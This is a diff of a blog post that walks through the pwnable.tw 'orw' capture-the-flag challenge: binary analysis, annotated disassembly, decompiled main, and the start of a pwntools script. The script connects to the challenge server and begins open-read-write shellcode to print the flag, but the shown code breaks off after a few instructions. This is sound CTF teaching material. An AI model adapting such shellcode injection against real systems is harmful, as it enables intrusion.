@@ -15,10 +15,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Pwnable &amp;#58; Orw">
+  <meta property="og:title" content="Pwnable.tw Orw">
   <meta property="og:description" content="A 100-point challenge from pwnable">
 
-  <title>Pwnable &amp;#58; Orw</title>
+  <title>Pwnable.tw Orw</title>
   <meta name="description" content="A 100-point challenge from pwnable">
 
   <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
@@ -66,7 +66,7 @@
 
 </nav>
     <div class="col-lg-10 mx-auto mt-5 markdown-body">
-  <h1><b>Pwnable &#58; Orw</b></h1>
+  <h1><b>Pwnable.tw Orw</b></h1>
 
 <p class="post-metadata text-muted">
   29 June 2022 -  
@@ -221,19 +221,8 @@ orw: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>S
 <p>So it’s a 32-bit Little-endian ELF. So pop the binary into your Linux machine to analyze. Remember to chmod the binary:</p>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x ./orw
 </code></pre></div></div>
-<p>Open the binary in pwndbg:</p>
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb <span class="nt">-q</span> ./orw
-pwndbg&gt; checksec
- <span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/dan09/CTF/Pwnable/orw'</span>
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found       
-    NX:       NX disabled
-    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-    RWX:      Has RWX segments
-</code></pre></div></div>
 
-<p>So there is a canary. Stack canary is a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immediately.</p>
+<p>Disassemble it:</p>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; disass
 Dump of assembler code <span class="k">for function </span>main:
    0x08048548 &lt;+0&gt;:     lea    ecx,[esp+0x4]
@@ -245,17 +234,17 @@ Dump of assembler code <span class="k">for function </span>main:
    0x08048556 &lt;+14&gt;:    sub    esp,0x4
    0x08048559 &lt;+17&gt;:    call   0x80484cb &lt;orw_seccomp&gt;     // This makes the binary only accept open, <span class="nb">read </span>and write syscall
    0x0804855e &lt;+22&gt;:    sub    esp,0xc
-   0x08048561 &lt;+25&gt;:    push   0x80486a0                    // an array pointer containing  <span class="s1">'Give my your shellcode:'</span> string
+   0x08048561 &lt;+25&gt;:    push   0x80486a0                    // an array pointer pointing to  <span class="s1">'Give my your shellcode:'</span> string
    0x08048566 &lt;+30&gt;:    call   0x8048380 &lt;<span class="nb">printf</span>@plt&gt;       // int <span class="nb">printf</span><span class="o">(</span>const char <span class="k">*</span>format, ...<span class="o">)</span> takes argument format <span class="o">(</span>a pointer<span class="o">)</span>
-   0x0804856b &lt;+35&gt;:    add    esp,0x10
-   0x0804856e &lt;+38&gt;:    sub    esp,0x4
-   0x08048571 &lt;+41&gt;:    push   0xc8
-   0x08048576 &lt;+46&gt;:    push   0x804a060
-   0x0804857b &lt;+51&gt;:    push   0x0
+   0x0804856b &lt;+35&gt;:    add    esp,0x10                     // clean up stacks
+   0x0804856e &lt;+38&gt;:    sub    esp,0x4             
+   0x08048571 &lt;+41&gt;:    push   0xc8                         // number of lengths
+   0x08048576 &lt;+46&gt;:    push   0x804a060                    // shellcode buffer
+   0x0804857b &lt;+51&gt;:    push   0x0                          // fd
    0x0804857d &lt;+53&gt;:    call   0x8048370 &lt;<span class="nb">read</span>@plt&gt;
    0x08048582 &lt;+58&gt;:    add    esp,0x10
    0x08048585 &lt;+61&gt;:    mov    eax,0x804a060
-   0x0804858a &lt;+66&gt;:    call   eax
+   0x0804858a &lt;+66&gt;:    call   eax                          // execute shellcode
    0x0804858c &lt;+68&gt;:    mov    eax,0x0
    0x08048591 &lt;+73&gt;:    mov    ecx,DWORD PTR <span class="o">[</span>ebp-0x4]
    0x08048594 &lt;+76&gt;:    leave  
@@ -268,7 +257,31 @@ pwndbg&gt; da 0x80486a0
 
 </code></pre></div></div>
 
+<p>Or you can just go the easy way and decompile it in IDA:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">orw_seccomp</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Give my your shellcode:"</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0xC8u</span><span class="p">);</span>
+  <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">shellcode</span><span class="p">)();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
 <p>Understand the code and you can move on to the next step.</p>
+
+<h2 id="3-exploitation">3. <u id="exploitation">Exploitation</u></h2>
+<p>So we can only use read, write and open in our syscall. So our job is to craft an one-off shellcode to read and write the flag to stdout for this challenge.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
+<span class="nb">open</span> <span class="o">=</span> <span class="s">'''
+mov eax, 0x5;
+push 0x00006761
+push 0x6c662f
+'''</span>
+</code></pre></div></div>
 
 
 
